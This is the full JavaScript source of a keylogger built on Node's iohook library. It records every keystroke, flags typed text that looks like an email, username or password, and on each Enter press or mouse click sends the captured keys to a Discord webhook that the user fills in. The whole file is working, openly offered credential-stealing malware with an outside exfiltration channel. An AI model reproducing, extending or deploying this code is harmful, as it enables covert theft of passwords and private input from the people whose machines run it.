// Import required modules
const iohook = require("iohook"); // Library to listen for input events
const fetch = require("node-fetch-commonjs"); // Library for making HTTP requests
const singleInstance = require("single-instance"); // Library to ensure a single instance of the app

// URL of the Discord webhook to send data to
// Change this to your own webhook URL
const webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL";

// Map of key codes to their corresponding key names
const keyCodeMap = {
  8: "Backspace",
  9: "Tab",
  13: "Enter",
  20: "Caps Lock",
  27: "Escape",
  32: " ",
  33: "Page Up",
  34: "Page Down",
  35: "End",
  36: "Home",
  37: "L Arrow",
  38: "Up Arrow",
  39: "R Arrow",
  40: "Down Arrow",
  44: "Print Screen",
  45: "Insert",
  46: "Delete",
  48: "0",
  49: "1",
  50: "2",
  51: "3",
  52: "4",
  53: "5",
  54: "6",
  55: "7",
  56: "8",
  57: "9",
  65: "A",
  66: "B",
  67: "C",
  68: "D",
  69: "E",
  70: "F",
  71: "G",
  72: "H",
  73: "I",
  74: "J",
  75: "K",
  76: "L",
  77: "M",
  78: "N",
  79: "O",
  80: "P",
  81: "Q",
  82: "R",
  83: "S",
  84: "T",
  85: "U",
  86: "V",
  87: "W",
  88: "X",
  89: "Y",
  90: "Z",
  91: "Windows (L)",
  92: "Windows (R)",
  93: "Context Menu",
  96: "Numpad 0",
  97: "Numpad 1",
  98: "Numpad 2",
  99: "Numpad 3",
  100: "Numpad 4",
  101: "Numpad 5",
  102: "Numpad 6",
  103: "Numpad 7",
  104: "Numpad 8",
  105: "Numpad 9",
  106: "Multiply (*)",
  107: "Add (+)",
  109: "Subtract (-)",
  110: "Decimal Point (.)",
  111: "Divide (/)",
  112: "F1",
  113: "F2",
  114: "F3",
  115: "F4",
  116: "F5",
  117: "F6",
  118: "F7",
  119: "F8",
  120: "F9",
  121: "F10",
  122: "F11",
  123: "F12",
  144: "Num Lock",
  145: "Scroll Lock",
  160: "Shift (L)",
  161: "Shift (R)",
  162: "Control (L)",
  163: "Control (R)",
  164: "Alt (L)",
  165: "Alt (R)",
  186: ";",
  187: "=",
  188: ",",
  189: "-",
  190: ".",
  191: "/",
  192: "`",
  219: "[",
  220: "\\",
  221: "]",
  222: "'",
};

// Ensure single instance of the application
const locker = new singleInstance("index");

// Array to store key codes
let keyCodes = [];

// Function to analyze the captured key codes
function analyzeKeyCodes(keyCodes) {
  if (keyCodes.length === 0) {
    console.log("No keycodes to analyze");
    return null;
  }
  let message = keyCodes.join(", ");
  console.log("Analyzing keycodes:", message);

  // Check for specific key patterns to generate different messages
  if (keyCodes.includes(".")) {
    // Message indicating a domain, email, username, or password
    message += "``` - Domain, email, username, or password @everyone";
  } else if (
    keyCodes.includes("2") &&
    (keyCodes.includes("Shift (L)") || keyCodes.includes("Shift (R)"))
  ) {
    // Message indicating an email or password
    message += "``` - Email or password @everyone";
  } else if (
    keyCodes.includes("-") &&
    (keyCodes.includes("Shift (L)") || keyCodes.includes("Shift (R)"))
  ) {
    // Message indicating a username or password
    message += "``` - Username or password @everyone";
  } else {
    // Default message
    message += "```";
  }
  return message;
}

// Function to send the analyzed key codes to the Discord webhook
async function sendToWebhook(analysis) {
  const requestBody = { content: analysis }; // Webhook request body
  try {
    console.log("Sending analysis to webhook");
    await fetch(webhookUrl, {
      method: "POST",
      body: JSON.stringify(requestBody),
      headers: { "Content-Type": "application/json" },
    });
    console.log("Analysis sent successfully");
  } catch (error) {
    console.error("Failed to send to webhook:", error);
  }
}

// Event listener for keydown events
iohook.on("keydown", async (event) => {
  try {
    const key = keyCodeMap[event.rawcode] || `${event.rawcode}?`; // Map raw key code to key name
    keyCodes.push(key); // Add key to keyCodes array
    console.log("Key down:", key);

    // If Enter key is pressed, analyze and send key codes
    if ([13].includes(event.rawcode)) {
      const analysis = analyzeKeyCodes(keyCodes);
      if (analysis) {
        await sendToWebhook("```" + analysis);
      }
      keyCodes = []; // Clear keyCodes array after sending
    }
  } catch (error) {
    console.error("Error handling keydown event:", error);
  }
});

// Event listener for mousedown events
iohook.on("mousedown", async (event) => {
  try {
    console.log("Mouse down event:", event.button);
    const analysis = analyzeKeyCodes(keyCodes); // Analyze key codes on mouse down
    if (analysis) {
      await sendToWebhook("```" + analysis);
    }
    keyCodes = []; // Clear keyCodes array after sending
  } catch (error) {
    console.error("Error handling mousedown event:", error);
  }
});

// Main execution block
try {
  locker
    .lock()
    .then(() => {
      console.log("Instance locked, starting iohook");
      iohook.start(); // Start listening for input events
    })
    .catch((err) => {
      console.error("Instance lock error:", err);
      process.exit(); // Exit if instance lock fails
    });
} catch (error) {
  console.error("Error initializing the application:", error);
}
